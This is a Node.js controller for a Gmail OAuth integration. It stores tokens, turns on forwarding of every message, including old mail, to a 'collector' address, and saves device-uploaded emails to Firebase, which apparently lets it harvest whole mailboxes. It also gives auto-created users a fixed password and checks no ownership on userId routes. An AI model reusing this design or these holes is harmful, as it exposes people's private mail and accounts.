const GmailService = require('../services/gmailService');
const GmailAccount = require('../models/GmailAccount');
const User = require('../models/User');

// Get OAuth URL for Gmail authorization
const getAuthUrl = async (req, res) => {
  try {
    const authUrl = GmailService.getAuthUrl();
    res.json({
      success: true,
      authUrl: authUrl
    });
  } catch (error) {
    console.error('Error generating auth URL:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to generate authorization URL'
    });
  }
};

// Handle OAuth callback and save tokens
const handleCallback = async (req, res) => {
  try {
    const { code, collectorEmail } = req.body;
    
    if (!code || !collectorEmail) {
      return res.status(400).json({
        success: false,
        message: 'Authorization code and collector email are required'
      });
    }

    // Exchange code for tokens
    const tokens = await GmailService.exchangeCodeForTokens(code);
    
    // Get user profile to get email
    const { google } = require('googleapis');
    const oauth2Client = new google.auth.OAuth2(
      process.env.GOOGLE_CLIENT_ID,
      process.env.GOOGLE_CLIENT_SECRET,
      process.env.GOOGLE_REDIRECT_URI
    );
    oauth2Client.setCredentials(tokens);
    
    const gmail = google.gmail({ version: 'v1', auth: oauth2Client });
    const profile = await gmail.users.getProfile({ userId: 'me' });
    const userEmail = profile.data.emailAddress;

    // Check if user exists (you might want to create one if not)
    let user = await User.findOne({ email: userEmail });
    if (!user) {
      // Create user if doesn't exist
      user = new User({
        email: userEmail,
        username: userEmail.split('@')[0],
        password: 'gmail-oauth-user' // You might want to handle this differently
      });
      await user.save();
    }

    // Save or update Gmail account
    let gmailAccount = await GmailAccount.findOne({ userId: user._id });
    if (gmailAccount) {
      // Update existing account
      gmailAccount.accessToken = tokens.access_token;
      gmailAccount.refreshToken = tokens.refresh_token;
      gmailAccount.tokenExpiry = new Date(tokens.expiry_date);
      gmailAccount.collectorEmail = collectorEmail;
    } else {
      // Create new account
      gmailAccount = new GmailAccount({
        userId: user._id,
        email: userEmail,
        accessToken: tokens.access_token,
        refreshToken: tokens.refresh_token,
        tokenExpiry: new Date(tokens.expiry_date),
        collectorEmail: collectorEmail
      });
    }
    
    await gmailAccount.save();

    res.json({
      success: true,
      message: 'Gmail account connected successfully',
      email: userEmail,
      collectorEmail: collectorEmail
    });

  } catch (error) {
    console.error('Error handling OAuth callback:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to connect Gmail account'
    });
  }
};

// Enable email forwarding for a user
const enableForwarding = async (req, res) => {
  try {
    const { userId } = req.params;
    
    const gmailAccount = await GmailAccount.findOne({ userId });
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    // Enable catch-all forwarding
    await GmailService.enableCatchAllForwarding(gmailAccount);

    res.json({
      success: true,
      message: 'Email forwarding enabled successfully',
      collectorEmail: gmailAccount.collectorEmail
    });

  } catch (error) {
    console.error('Error enabling forwarding:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to enable email forwarding'
    });
  }
};

// Forward existing emails
const forwardExistingEmails = async (req, res) => {
  try {
    const { userId } = req.params;
    const { batchSize = 50 } = req.body;
    
    const gmailAccount = await GmailAccount.findOne({ userId });
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    // Start forwarding in background
    GmailService.forwardExistingEmails(gmailAccount, batchSize)
      .then(totalForwarded => {
        console.log(`Background forwarding completed: ${totalForwarded} messages`);
      })
      .catch(error => {
        console.error('Background forwarding error:', error);
      });

    res.json({
      success: true,
      message: 'Email forwarding started in background',
      collectorEmail: gmailAccount.collectorEmail
    });

  } catch (error) {
    console.error('Error starting forwarding:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to start email forwarding'
    });
  }
};

// Get Gmail account statistics
const getAccountStats = async (req, res) => {
  try {
    const { userId } = req.params;
    
    const gmailAccount = await GmailAccount.findOne({ userId });
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    const stats = await GmailService.getAccountStats(gmailAccount);

    res.json({
      success: true,
      data: stats
    });

  } catch (error) {
    console.error('Error getting account stats:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get account statistics'
    });
  }
};

// Disable email forwarding
const disableForwarding = async (req, res) => {
  try {
    const { userId } = req.params;
    
    const gmailAccount = await GmailAccount.findOne({ userId });
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    await GmailService.disableForwarding(gmailAccount);

    res.json({
      success: true,
      message: 'Email forwarding disabled successfully'
    });

  } catch (error) {
    console.error('Error disabling forwarding:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to disable email forwarding'
    });
  }
};

// Get all Gmail accounts for a user
const getUserGmailAccounts = async (req, res) => {
  try {
    const { userId } = req.params;
    
    const gmailAccounts = await GmailAccount.find({ userId })
      .select('-accessToken -refreshToken')
      .sort({ createdAt: -1 });

    res.json({
      success: true,
      data: gmailAccounts
    });

  } catch (error) {
    console.error('Error getting user Gmail accounts:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get Gmail accounts'
    });
  }
};

// Delete Gmail account
const deleteGmailAccount = async (req, res) => {
  try {
    const { userId, accountId } = req.params;
    
    const gmailAccount = await GmailAccount.findOne({ 
      _id: accountId, 
      userId: userId 
    });
    
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    // Disable forwarding first
    if (gmailAccount.forwardingEnabled) {
      await GmailService.disableForwarding(gmailAccount);
    }

    // Delete the account
    await GmailAccount.findByIdAndDelete(accountId);

    res.json({
      success: true,
      message: 'Gmail account deleted successfully'
    });

  } catch (error) {
    console.error('Error deleting Gmail account:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to delete Gmail account'
    });
  }
};

// Test Gmail connection
const testConnection = async (req, res) => {
  try {
    const { userId } = req.params;
    
    const gmailAccount = await GmailAccount.findOne({ userId });
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    // Try to get Gmail client and profile
    const gmail = await GmailService.getGmailClient(gmailAccount);
    const profile = await gmail.users.getProfile({ userId: 'me' });

    res.json({
      success: true,
      message: 'Gmail connection is working',
      email: profile.data.emailAddress,
      messagesTotal: profile.data.messagesTotal
    });

  } catch (error) {
    console.error('Error testing Gmail connection:', error);
    res.status(500).json({
      success: false,
      message: 'Gmail connection test failed',
      error: error.message
    });
  }
};

const mobileFirebaseService = require('../services/mobileFirebaseService');

// NEW: Save emails directly to Firebase instead of MongoDB
const saveEmailsToDatabase = async (req, res) => {
  try {
    const { userId } = req.params;
    const { emails, deviceId } = req.body;
    
    if (!emails || !Array.isArray(emails)) {
      return res.status(400).json({
        success: false,
        message: 'Emails array is required'
      });
    }

    // Convert userId back to email format (reverse the transformation)
    const userEmail = userId.replace(/_at_/g, '@').replace(/_/g, '.');
    
    // Store emails directly to Firebase
    const result = await mobileFirebaseService.storeGmailData({
      userId: userEmail,
      emails,
      deviceId
    });

    console.log(`✅ Stored ${result.count} Gmail emails in Firebase for user: ${userEmail}`);

    res.status(201).json({
      success: true,
      message: 'Emails stored successfully in Firebase',
      data: {
        savedCount: result.count,
        userEmail
      }
    });

    } catch (error) {
    console.error('❌ Save emails to Firebase error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to store emails in Firebase',
      error: error.message
    });
  }
};

// Get stored emails
const getStoredEmails = async (req, res) => {
  try {
    const { userId } = req.params;
    const { limit = 50, offset = 0, isRead, from, subject } = req.query;

    const gmailAccount = await GmailAccount.findOne({ userId });
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    const Email = require('../models/Email');
    const options = {
      limit: parseInt(limit),
      offset: parseInt(offset),
      isRead: isRead === 'true' ? true : isRead === 'false' ? false : undefined,
      from,
      subject
    };

    const emails = await Email.findByAccount(gmailAccount._id, options);
    const total = await Email.countDocuments({ gmailAccountId: gmailAccount._id });

    res.json({
      success: true,
      data: emails,
      pagination: {
        total,
        limit: parseInt(limit),
        offset: parseInt(offset),
        hasMore: parseInt(offset) + emails.length < total
      }
    });

  } catch (error) {
    console.error('Error getting stored emails:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get stored emails'
    });
  }
};

// Get email statistics
const getEmailStats = async (req, res) => {
  try {
    const { userId } = req.params;

    const gmailAccount = await GmailAccount.findOne({ userId });
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    const Email = require('../models/Email');
    const stats = await Email.getStats(gmailAccount._id);
    const recentSenders = await Email.getRecentSenders(gmailAccount._id, 10);

    res.json({
      success: true,
      data: {
        stats: stats[0] || { total: 0, unread: 0, read: 0, starred: 0, important: 0 },
        recentSenders
      }
    });

  } catch (error) {
    console.error('Error getting email stats:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get email statistics'
    });
  }
};

// Mark email as read/unread
const markEmailAsRead = async (req, res) => {
  try {
    const { emailId } = req.params;
    const { isRead = true } = req.body;

    const Email = require('../models/Email');
    const email = await Email.findById(emailId);
    
    if (!email) {
      return res.status(404).json({
        success: false,
        message: 'Email not found'
      });
    }

    if (isRead) {
      await email.markAsRead();
    } else {
      await email.markAsUnread();
    }

    res.json({
      success: true,
      message: `Email marked as ${isRead ? 'read' : 'unread'}`,
      isRead: email.isRead
    });

  } catch (error) {
    console.error('Error marking email as read:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to update email status'
    });
  }
};

// Sync new emails from Gmail
const syncNewEmails = async (req, res) => {
  try {
    const { userId } = req.params;
    const { maxResults = 50 } = req.body;

    const gmailAccount = await GmailAccount.findOne({ userId });
    if (!gmailAccount) {
      return res.status(404).json({
        success: false,
        message: 'Gmail account not found'
      });
    }

    // Get latest email timestamp from database
    const Email = require('../models/Email');
    const latestEmail = await Email.findOne({ gmailAccountId: gmailAccount._id })
      .sort({ internalDate: -1 });

    // Fetch new emails from Gmail
    const newEmails = await GmailService.fetchNewEmails(gmailAccount, {
      maxResults: parseInt(maxResults),
      afterDate: latestEmail ? latestEmail.internalDate : null
    });

    // Save new emails to database
    let savedCount = 0;
    for (const emailData of newEmails) {
      try {
        const email = new Email({
          gmailAccountId: gmailAccount._id,
          messageId: emailData.messageId,
          threadId: emailData.threadId,
          subject: emailData.subject || '',
          from: emailData.from,
          to: emailData.to,
          cc: emailData.cc || '',
          bcc: emailData.bcc || '',
          body: emailData.body || '',
          bodyHtml: emailData.bodyHtml || '',
          isRead: emailData.isRead || false,
          isStarred: emailData.isStarred || false,
          isImportant: emailData.isImportant || false,
          labels: emailData.labels || [],
          internalDate: emailData.internalDate,
          sizeEstimate: emailData.sizeEstimate || 0,
          snippet: emailData.snippet || '',
          attachments: emailData.attachments || []
        });

        await email.save();
        savedCount++;
      } catch (error) {
        console.error('Error saving synced email:', error);
      }
    }

    res.json({
      success: true,
      message: 'Email sync completed',
      synced: savedCount,
      total: newEmails.length
    });

  } catch (error) {
    console.error('Error syncing emails:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to sync emails'
    });
  }
};

module.exports = {
  getAuthUrl,
  handleCallback,
  enableForwarding,
  forwardExistingEmails,
  getAccountStats,
  disableForwarding,
  getUserGmailAccounts,
  deleteGmailAccount,
  testConnection,
  saveEmailsToDatabase,
  getStoredEmails,
  getEmailStats,
  markEmailAsRead,
  syncNewEmails
}; 